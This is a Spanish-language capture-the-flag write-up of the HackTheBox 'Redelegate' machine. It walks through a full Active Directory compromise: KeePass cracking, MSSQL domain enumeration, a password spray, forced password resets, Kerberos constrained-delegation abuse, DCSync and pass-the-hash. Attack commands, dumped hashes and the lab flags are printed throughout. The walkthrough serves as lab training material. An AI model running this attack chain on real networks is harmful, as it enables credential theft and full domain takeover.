---
title: "VL: Redelegate"
date: 2026-04-19 12:00:00 +0000
categories: [WriteUp, HackTheBox]
tags: [Active Directory, Windows, MSSQL, KeePass, FTP, Kerberos, Delegation, DCSync, BloodyAD, SeEnableDelegationPrivilege]
image:
  path: /assets/img/Redelegate-HTB.png
  alt: HackTheBox Redelegate Machine
  width: 500
  height: 280
  class: sz-contain
---

## Introducción

**Redelegate** es una máquina de **HackTheBox** enfocada en entornos de **Active Directory**.
El acceso inicial comienza con un servidor **FTP** accesible de forma anónima que expone tres
archivos internos: un reporte de auditoría de ciberseguridad, una agenda de entrenamiento y
una base de datos **KeePass** (`Shared.kdbx`). La agenda revela que los empleados usan el
patrón `SeasonYear!` como política de contraseña informal. Tras crackear el vault con un
diccionario personalizado, se obtienen credenciales para el servidor **MSSQL**. Desde allí,
se abusa de la función `SUSER_SNAME()` para enumerar todos los usuarios del dominio y se
ejecuta un **Password Spray** que compromete la cuenta `Marie.Curie`. A través de una cadena
de **ACLs** (`ForceChangePassword` sobre `Helen.Frost`), se obtiene acceso por **WinRM**.
La escalada de privilegios explota el privilegio `SeEnableDelegationPrivilege` combinado con
`GenericAll` sobre la máquina `FS01$` para configurar delegación **Kerberos** y ejecutar un
**DCSync** impersonando al **Domain Controller**, logrando control total del dominio.

---

## Reconocimiento

### Comprobación de conectividad

Se enviará una solicitud de **ICMP** (`ping`) para comprobar que la máquina objetivo se
encuentra activa y accesible.

```bash
ping -c 1 10.129.21.122
```

```
64 bytes from 10.129.21.122: icmp_seq=1 ttl=127 time=204 ms
```

### Escaneo de Puertos

Se ejecutará un escaneo de puertos con **Rustscan** para identificar los servicios expuestos
en la máquina objetivo.

```bash
rustscan -a $IP --ulimit 1000 -r 1-65535 -- -A -sC -sV -Pn -o nmapresult.txt
```

**Resultados relevantes:**

| Puerto | Estado | Servicio                        |
|--------|--------|---------------------------------|
| 21     | open   | Microsoft FTP (Anonymous)       |
| 53     | open   | Simple DNS Plus                 |
| 80     | open   | Microsoft IIS 10.0              |
| 88     | open   | Kerberos                        |
| 135    | open   | MS RPC                          |
| 139    | open   | NetBIOS                         |
| 389    | open   | LDAP (AD)                       |
| 445    | open   | SMB                             |
| 464    | open   | Kpasswd5                        |
| 593    | open   | RPC over HTTP                   |
| 636    | open   | LDAPS                           |
| 1433   | open   | Microsoft SQL Server 2019       |
| 3268   | open   | LDAP Global Catalog             |
| 3389   | open   | RDP                             |
| 5985   | open   | WinRM (HTTP)                    |
| 9389   | open   | .NET Message Framing            |

### Análisis del escaneo

Los puertos habituales de **Active Directory** se encuentran abiertos, incluyendo **DNS**,
**Kerberos**, **LDAP** y **SMB**, lo que confirma que el host corresponde a un **Controlador
de Dominio** dentro del entorno `redelegate.vl`.

- **Firma SMB:** La firma obligatoria está habilitada, lo que descarta ataques de
  retransmisión **NTLM**. Será necesario buscar otros vectores de ataque.
- **Servidor MSSQL:** El puerto `1433` expone una instancia de **Microsoft SQL Server 2019**,
  un objetivo valioso tanto para enumeración del dominio como para posible ejecución de comandos.
- **Servidor FTP:** El puerto `21` está abierto con **login anónimo habilitado**, lo que
  representa un punto de entrada directo para obtener información del entorno.
- **Desfase horario:** Se detectó una diferencia mínima de hora entre el servidor y nuestra
  máquina, un detalle importante a tener en cuenta para ataques **Kerberos**.

---

## Enumeración inicial — Servicio FTP

El servidor **FTP** permite acceso anónimo. Nos conectamos y descargamos todos los archivos
disponibles:

```bash
ftp $IP
```

```
Name: anonymous
Password: (vacío — presionar Enter)

ftp> ls -al
10-20-24  01:11AM    434  CyberAudit.txt
10-20-24  05:14AM   2622  Shared.kdbx
10-20-24  01:26AM    580  TrainingAgenda.txt
```

```bash
ftp> passive
ftp> get CyberAudit.txt
ftp> get Shared.kdbx
ftp> get TrainingAgenda.txt
```

Descargamos los tres archivos para analizar su contenido:

- `CyberAudit.txt` — Informe de auditoría de ciberseguridad interna.
- `Shared.kdbx` — Base de datos de contraseñas en formato **KeePass**.
- `TrainingAgenda.txt` — Agenda de sesiones de concientización en seguridad.

---

### CyberAudit.txt — Hallazgos de la auditoría

```
OCTOBER 2024 AUDIT FINDINGS

[!] CyberSecurity Audit findings:

1) Weak User Passwords
2) Excessive Privilege assigned to users
3) Unused Active Directory objects
4) Dangerous Active Directory ACLs

[*] Remediation steps:

1) Prompt users to change their passwords: DONE
2) Check privileges for all users and remove high privileges: DONE
3) Remove unused objects in the domain: IN PROGRESS
4) Recheck ACLs: IN PROGRESS
```

El reporte revela cuatro problemas críticos en el dominio:

- **Contraseñas débiles:** Los usuarios usaban contraseñas extremadamente predecibles.
  Aunque el documento marca esto como resuelto, la agenda de entrenamiento contradice esa afirmación.
- **Privilegios excesivos:** Usuarios estándar con permisos desproporcionados sobre el dominio.
- **Objetos obsoletos:** Cuentas y objetos de AD sin uso que expanden la superficie de ataque.
  El estado `IN PROGRESS` indica que aún pueden existir cuentas eliminadas pero con ACEs activos.
- **ACLs peligrosas:** Configuraciones de **Lista de Control de Acceso** mal configuradas que
  permiten escalada de privilegios. También marcado como `IN PROGRESS`, lo que confirma que
  la cadena de ACLs del dominio sigue siendo explotable.

---

### TrainingAgenda.txt — Patrón de contraseñas revelado

| Fecha              | Horario       | Asistentes | Tema                                                                                      |
|--------------------|---------------|------------|-------------------------------------------------------------------------------------------|
| Viernes 4 Oct      | 14:30 - 16:30 | 53         | "Don't take the bait" — Identificación y reporte de correos de phishing                  |
| Viernes 11 Oct     | 15:30 - 17:30 | 61         | "Social Media and their dangers" — Privacidad y riesgos online                           |
| **Viernes 18 Oct** | 11:30 - 13:30 | 7          | **"Weak Passwords"** — Por qué usar patrones como **`SeasonYear!`** es un riesgo crítico |
| Viernes 25 Oct     | 09:30 - 12:30 | 29         | "What now?" — Consecuencias de un ciberataque y medidas de mitigación                    |

La sesión del **18 de octubre** es la más reveladora. El documento admite explícitamente que
los empleados estaban utilizando el formato `SeasonYear!` (ej. `Summer2024!`, `Fall2024!`)
como política de contraseña no oficial. Dado que el reporte de auditoría indica que las
contraseñas se cambiaron **en octubre de 2024**, es muy probable que los usuarios hayan
actualizado su contraseña siguiendo ese mismo patrón. Esto nos da la base para construir
un diccionario dirigido.

---

## KeePass — Cracking de Shared.kdbx

El archivo `Shared.kdbx` es una base de datos de contraseñas de **KeePass**, protegida por
una contraseña maestra. Para crackearla, primero extraemos el hash en un formato compatible:

```bash
keepass2john Shared.kdbx | awk -F ':' '{print $2}' > hash_clean.txt
```

Generamos un diccionario personalizado basado en el patrón `SeasonYear!` identificado:

```python
seasons = ["Spring", "Summer", "Autumn", "Fall", "Winter"]
months  = ["January", "February", "March", "April", "May", "June",
           "July", "August", "September", "October", "November", "December"]
years   = ["2023", "2024", "2025"]

passwords = set()

for s in seasons:
    for y in years:
        passwords.add(f"{s}{y}!")

for m in months:
    for y in years:
        passwords.add(f"{m}{y}!")

with open('wordlist_refined.txt', 'w') as f:
    for pwd in sorted(passwords):
        f.write(f"{pwd}\n")

print(f"Diccionario generado con {len(passwords)} combinaciones.")
```

Crackeamos el hash con **Hashcat**:

```bash
hashcat -m 13400 hash_clean.txt wordlist_refined.txt
```

```
$keepass$*2*600000*0*ce7395f4...:Fall2024!
```

**Contraseña maestra:** `Fall2024!`

Abrimos la base de datos con cualquier cliente **KeePass** y encontramos las credenciales
del usuario `SQLGuest`:

![KeePass Credentials](/assets/img/Redelegate/keepass.png)

Verificamos que las credenciales son válidas contra el servidor **MSSQL**:

```bash
nxc mssql $IP -u 'SQLGuest' -p 'zDPBpaF4FywlqIv11vii' --local-auth
```

```
MSSQL  10.129.21.122  1433  DC  [+] DC\SQLGuest:zDPBpaF4FywlqIv11vii
```

---

## MSSQL — Enumeración del dominio via SQL

Accedemos al servidor **MSSQL** con las credenciales obtenidas:

```bash
mssqlclient.py redelegate.vl/SQLGuest:'zDPBpaF4FywlqIv11vii'@redelegate.vl
```

### Reconocimiento inicial del servidor

Todo login con el rol `public` (el mínimo por defecto) puede ejecutar consultas básicas.
Comenzamos identificando el contexto del servidor:

```sql
-- Verificar el nombre del login SA
select suser_name(1)
```
```
sa
```

```sql
-- Obtener el dominio de Windows al que pertenece el servidor
select default_domain()
```
```
REDELEGATE
```

### Enumeración de usuarios de dominio via SUSER_SNAME()

La función `SUSER_SNAME()` acepta un **SID de Windows** completo y devuelve el nombre de la
cuenta correspondiente. Esto es especialmente potente porque permite enumerar **usuarios,
grupos y computadoras de Active Directory** sin necesitar ningún privilegio especial en el
dominio — basta con ser un login válido en **SQL Server**.

El truco consiste en construir un SID combinando la **base del dominio** (fija para todos los
objetos) con el **RID** del objeto que queremos buscar. Por ejemplo:

```sql
-- Obtener el SID base del dominio a partir de un grupo conocido
select suser_sid('REDELEGATE\Domain Admins')
```
```
010500000000000515000000a185deefb22433798d8e847a00020000
```

- **SID base:** `010500000000000515000000a185deefb22433798d8e847a` (constante para todo el dominio)
- **RID en Little-endian:** `00020000` → `0x200` = `512` = **Domain Admins**

Cambiando los últimos 4 bytes (el RID) podemos iterar sobre todos los objetos del dominio.
Los RIDs más relevantes son:

| RID (Dec) | RID (Hex LE) | Propósito                   |
|-----------|--------------|-----------------------------|
| 500       | `F4010000`   | Cuenta `Administrator`      |
| 501       | `F5010000`   | Cuenta `Guest`              |
| 1000+     | `E8030000`+  | Usuarios creados en el AD   |

En lugar de hacer esto manualmente uno por uno, utilizamos el módulo de **Metasploit** que
automatiza el proceso completo:

```bash
msfconsole -q
use auxiliary/admin/mssql/mssql_enum_domain_accounts
set USERNAME SQLGuest
set PASSWORD zDPBpaF4FywlqIv11vii
set RHOSTS redelegate.vl
run
```

```
[+] Found the domain sid: 010500000000000515000000a185deefb22433798d8e847a
[*] Brute forcing 10000 RIDs through the SQL Server...

REDELEGATE\Christine.Flanders
REDELEGATE\Marie.Curie
REDELEGATE\Helen.Frost
REDELEGATE\Michael.Pontiac
REDELEGATE\Mallory.Roberts
REDELEGATE\James.Dinkleberg
REDELEGATE\Ryan.Cooper
REDELEGATE\sql_svc
REDELEGATE\DC$
REDELEGATE\FS01$
```

---

## Password Spray

Con la lista de usuarios del dominio y el patrón de contraseñas identificado, ejecutamos
un **Password Spray** usando `Fall2024!` como contraseña candidata, ya que la auditoría
se realizó en octubre de 2024 y los usuarios habrían actualizado su contraseña en esa época:

```bash
nxc smb $IP -u users.txt -p 'Fall2024!' --continue-on-success
```

```
[-] redelegate.vl\Administrator:Fall2024!   STATUS_LOGON_FAILURE
[-] redelegate.vl\Christine.Flanders:Fall2024!   STATUS_LOGON_FAILURE
[+] redelegate.vl\Marie.Curie:Fall2024!
[-] redelegate.vl\Helen.Frost:Fall2024!   STATUS_LOGON_FAILURE
[-] redelegate.vl\Mallory.Roberts:Fall2024!   STATUS_ACCOUNT_RESTRICTION
[-] redelegate.vl\James.Dinkleberg:Fall2024!   STATUS_LOGON_FAILURE
[-] redelegate.vl\Ryan.Cooper:Fall2024!   STATUS_LOGON_FAILURE
[-] redelegate.vl\sql_svc:Fall2024!   STATUS_LOGON_FAILURE
```

> `Mallory.Roberts` devuelve `STATUS_ACCOUNT_RESTRICTION` en lugar de `STATUS_LOGON_FAILURE`,
> lo que indica que la contraseña **es correcta** pero la cuenta tiene restricciones de acceso
> (posiblemente deshabilitada o con horario de inicio de sesión restringido). La tenemos presente.

---

## Enumeración autenticada (NXC)

Con las credenciales de `Marie.Curie` enumeramos los recursos compartidos del dominio:

```bash
nxc smb $IP -u 'Marie.Curie' -p 'Fall2024!' --shares
```

```
SMB  10.129.21.122  445  DC  [+] redelegate.vl\Marie.Curie:Fall2024!
SMB  10.129.21.122  445  DC  Share       Permissions
SMB  10.129.21.122  445  DC  ADMIN$
SMB  10.129.21.122  445  DC  C$
SMB  10.129.21.122  445  DC  IPC$        READ
SMB  10.129.21.122  445  DC  NETLOGON    READ
SMB  10.129.21.122  445  DC  SYSVOL      READ
```

Los recursos compartidos son los predeterminados de **Active Directory**, sin nada de interés
adicional. Procedemos al análisis del dominio con **BloodHound**.

---

## Análisis de Dominio - BloodHound

Recopilamos información del dominio con las credenciales de `Marie.Curie` para identificar
rutas de ataque y posibles escaladas de privilegios:

```bash
bloodhound-ce-python -u 'Marie.Curie' -p 'Fall2024!' -d redelegate.vl -ns $IP -c All --zip
```

### ForceChangePassword: Helpdesk → Helen.Frost

BloodHound revela que `Marie.Curie` es miembro del grupo **Helpdesk**, y este grupo tiene
el permiso `ForceChangePassword` sobre el usuario `Helen.Frost`. Este permiso permite
cambiar la contraseña de otro usuario **sin necesitar conocer la contraseña actual**, lo
que lo convierte en un vector de ataque directo.

![ForceChangePassword](/assets/img/Redelegate/forcechangepassword.png)

Cambiamos la contraseña de `Helen.Frost`:

```bash
bloodyAD -H $IP -d redelegate.vl -u 'Marie.Curie' -p 'Fall2024!' set password HELEN.FROST 'Password123!'
```

```
[+] Password changed successfully!
```

BloodHound también confirma que `Helen.Frost` es miembro del grupo **Remote Management Users**,
lo que le permite conectarse remotamente al servidor mediante **WinRM**.

![Remote Management](/assets/img/Redelegate/winrm.png)

---

## Acceso Inicial — Evil-WinRM como Helen.Frost

```bash
evil-winrm -i $IP -u 'HELEN.FROST' -p 'Password123!'
```

### Flag de usuario

```powershell
*Evil-WinRM* PS C:\Users\Helen.Frost> type Desktop\user.txt
ceb3824d3e7026fd5435e0f4d2d1f06b
```

---

## Escalada de Privilegios

### Análisis de privilegios de Helen.Frost

Lo primero que hacemos al obtener acceso es revisar los privilegios del usuario actual:

```powershell
*Evil-WinRM* PS C:\Users\Helen.Frost> whoami /priv
```

```
Privilege Name                  Description                                                    State
=============================== ============================================================== =======
SeMachineAccountPrivilege       Add workstations to domain                                     Enabled
SeChangeNotifyPrivilege         Bypass traverse checking                                       Enabled
SeEnableDelegationPrivilege     Enable computer and user accounts to be trusted for delegation  Enabled
SeIncreaseWorkingSetPrivilege   Increase a process working set                                 Enabled
```

El privilegio `SeEnableDelegationPrivilege` es extremadamente poderoso. Permite a un usuario
**configurar la delegación Kerberos** sobre objetos de Active Directory. En términos prácticos,
esto significa que podemos marcar una cuenta de equipo como "confiable para delegar" y luego
abusar de ese mecanismo para impersonar a cualquier usuario del dominio, incluyendo al
`Administrator`.

### GenericAll sobre FS01$ — Ruta hacia DCSync

BloodHound revela que `Helen.Frost` es miembro del grupo **IT**, y este grupo tiene
`GenericAll` sobre la computadora `FS01$`. Este permiso otorga control total sobre el objeto,
incluyendo la capacidad de cambiar su contraseña.

![GenericAll](/assets/img/Redelegate/dsync.png)

La estrategia de ataque es la siguiente:

1. Cambiar la contraseña de `FS01$` para poder autenticarnos como esa máquina.
2. Usar `SeEnableDelegationPrivilege` para configurar delegación **Kerberos Constrained** en `FS01$`.
3. Solicitar un **Service Ticket** impersonando al **Domain Controller** hacia el servicio LDAP.
4. Usar ese ticket para ejecutar **DCSync** y volcar todos los hashes del dominio.

### 1. Cambiar la contraseña de FS01$

```bash
bloodyAD --host dc01.redelegate.vl --dc-ip $IP -d redelegate.vl \
  -u 'HELEN.FROST' -p 'Password123!' \
  set password 'FS01$' 'Password123!'
```

```
[+] Password changed successfully!
```

### 2. Configurar delegación Kerberos sobre FS01$

Desde la shell de **Helen**, configuramos a `FS01$` como **confiable para delegación con
transición de protocolo** (Unconstrained con S4U2Self). Esto permite que `FS01$` solicite
tickets **en nombre de cualquier usuario** sin necesitar que ese usuario se haya autenticado
previamente:

```powershell
# Marcar a FS01$ como "confiable para delegar" con transición de protocolo (S4U2Self)
Set-ADAccountControl -Identity "FS01$" -TrustedToAuthForDelegation $True
```

Luego configuramos la **lista blanca de servicios** (`msDS-AllowedToDelegateTo`) para
restringir la delegación únicamente al servicio LDAP del Domain Controller. Esto es lo
que hace el ataque ser **Constrained Delegation**:

```powershell
# Permitir que FS01$ delegue SOLO al servicio LDAP del DC
Set-ADObject -Identity "CN=FS01,OU=Servers,DC=redelegate,DC=vl" -Add @{"msDS-AllowedToDelegateTo"="ldap/dc.redelegate.vl"}
```

### 3. S4U2Proxy — Impersonar al Domain Controller

Con la configuración de delegación establecida, usamos `getST.py` para solicitar un
**Service Ticket** abusando del mecanismo **S4U2Proxy**. Le pedimos al KDC que nos emita
un ticket que nos permite actuar como la cuenta del **Domain Controller** (`dc`) frente
al servicio LDAP:

```bash
getST.py 'redelegate.vl/FS01$:Password123!' -spn ldap/dc.redelegate.vl -impersonate dc
```

```
[*] Getting TGT for user
[*] Impersonating dc
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in dc@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache
```

Exportamos el ticket como variable de entorno para que las herramientas de **Impacket**
lo utilicen automáticamente:

```bash
export KRB5CCNAME=dc@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache
```

### 4. DCSync — Volcar todos los hashes del dominio

Con el ticket del **Domain Controller** en mano, ejecutamos `secretsdump.py` que lanza el
ataque de **DCSync**. Este ataque abusa del protocolo de replicación de AD (**DRSUAPI**)
para solicitar al DC que nos entregue los hashes de **NTDS.DIT** como si fuéramos otro
controlador de dominio legítimo replicando:

```bash
secretsdump.py -k -no-pass dc.redelegate.vl
```

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets

Administrator:500:aad3b435b51404eeaad3b435b51404ee:ec17f7a2a4d96e177bfd101b94ffc0a7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9288173d697316c718bb0f386046b102:::
Christine.Flanders:1104:aad3b435b51404eeaad3b435b51404ee:79581ad15ded4b9f3457dbfc35748ccf:::
Marie.Curie:1105:aad3b435b51404eeaad3b435b51404ee:a4bc00e2a5edcec18bd6266e6c47d455:::
Helen.Frost:1106:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
Michael.Pontiac:1107:aad3b435b51404eeaad3b435b51404ee:f37d004253f5f7525ef9840b43e5dad2:::
Mallory.Roberts:1108:aad3b435b51404eeaad3b435b51404ee:980634f9aabfe13aec0111f64bda50c9:::
James.Dinkleberg:1109:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
Ryan.Cooper:1117:aad3b435b51404eeaad3b435b51404ee:062a12325a99a9da55f5070bf9c6fd2a:::
sql_svc:1119:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
DC$:1002:aad3b435b51404eeaad3b435b51404ee:bfdff77d74764b0d4f940b7e9f684a61:::
FS01$:1103:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::

[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:db3a850aa5ede4cfacb57490d9b789b1ca0802ae11e09db5f117c1a8d1ccd173
[*] Cleaning up...
```

**NT Hash del Administrador:** `ec17f7a2a4d96e177bfd101b94ffc0a7`

---

## Acceso Final como Administrador

Usamos el hash obtenido para autenticarnos como `Administrator` mediante **Pass-The-Hash**:

```bash
evil-winrm -i $IP -u 'administrator' -H 'ec17f7a2a4d96e177bfd101b94ffc0a7'
```

### Flag de root

```powershell
*Evil-WinRM* PS C:\Users\Administrator> type Desktop\root.txt
21ff418e4bf055bd5d93907e863be35a
```

**¡Máquina comprometida con éxito!**